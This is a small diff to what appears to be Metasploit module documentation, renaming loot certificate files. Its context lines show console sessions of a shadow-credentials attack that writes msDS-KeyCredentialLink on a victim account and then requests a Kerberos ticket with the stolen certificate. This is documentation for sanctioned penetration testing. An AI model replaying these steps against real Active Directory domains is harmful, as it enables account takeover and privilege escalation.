@@ -152,7 +152,7 @@ msf6 auxiliary(admin/ldap/shadow_credentials) > run
 
 [*] Discovering base DN automatically
 [+] 20.92.148.129:389 Discovered base DN: DC=msf,DC=local
-[*] Certificate stored at: /home/user/.msf4/loot/20240404115740_default_20.92.148.129_windows.shadowcr_300384.pfx
+[*] Certificate stored at: /home/user/.msf4/loot/20240404115740_default_20.92.148.129_windows.ad.cs_300384.pfx
 [+] Successfully updated the msDS-KeyCredentialLink attribute; certificate with device ID 8a75b35e-f4d9-4469-49aa-3f0bfc692f07
 [*] Auxiliary module execution completed
 ```
@@ -167,8 +167,8 @@ msf6 auxiliary(admin/kerberos/get_ticket) > set username victim
 username => victim
 msf6 auxiliary(admin/kerberos/get_ticket) > set domain MSF.LOCAL
 domain => MSF.LOCAL
-msf6 auxiliary(admin/kerberos/get_ticket) > set cert_file /home/user/.msf4/loot/20240404115740_default_20.92.148.129_windows.shadowcr_300384.pfx
-cert_file => /home/user/.msf4/loot/20240404115740_default_20.92.148.129_windows.shadowcr_300384.pfx
+msf6 auxiliary(admin/kerberos/get_ticket) > set cert_file /home/user/.msf4/loot/20240404115740_default_20.92.148.129_windows.ad.cs_300384.pfx
+cert_file => /home/user/.msf4/loot/20240404115740_default_20.92.148.129_windows.ad.cs_300384.pfx
 msf6 auxiliary(admin/kerberos/get_ticket) > run
 [*] Running module against 20.92.148.129
 
@@ -212,7 +212,7 @@ msf6 auxiliary(admin/ldap/shadow_credentials) > run rhost=20.92.148.129 username
 [*] Discovering base DN automatically
 [*] 20.92.148.129:389 Getting root DSE
 [+] 20.92.148.129:389 Discovered base DN: DC=msf,DC=local
-[*] Certificate stored at: /home/user/.msf4/loot/20240404122017_default_20.92.148.129_windows.shadowcr_502988.pfx
+[*] Certificate stored at: /home/user/.msf4/loot/20240404122017_default_20.92.148.129_windows.ad.cs_502988.pfx
 [+] Successfully updated the msDS-KeyCredentialLink attribute; certificate with device ID ff946afc-a94a-f9c5-7229-861bb9ee4709
 [*] Auxiliary module execution completed
 ```
@@ -258,7 +258,7 @@ msf6 auxiliary(admin/ldap/shadow_credentials) > run rhost=20.92.148.129 username
 [*] Discovering base DN automatically
 [*] 20.92.148.129:389 Getting root DSE
 [+] 20.92.148.129:389 Discovered base DN: DC=msf,DC=local
-[*] Certificate stored at: /home/user/.msf4/loot/20240404122240_default_20.92.148.129_windows.shadowcr_785877.pfx
+[*] Certificate stored at: /home/user/.msf4/loot/20240404122240_default_20.92.148.129_windows.ad.cs_785877.pfx
 [+] Successfully updated the msDS-KeyCredentialLink attribute; certificate with device ID 1107833b-0eb6-0477-a7c6-3590b326851a
 [*] Auxiliary module execution completed
 ```
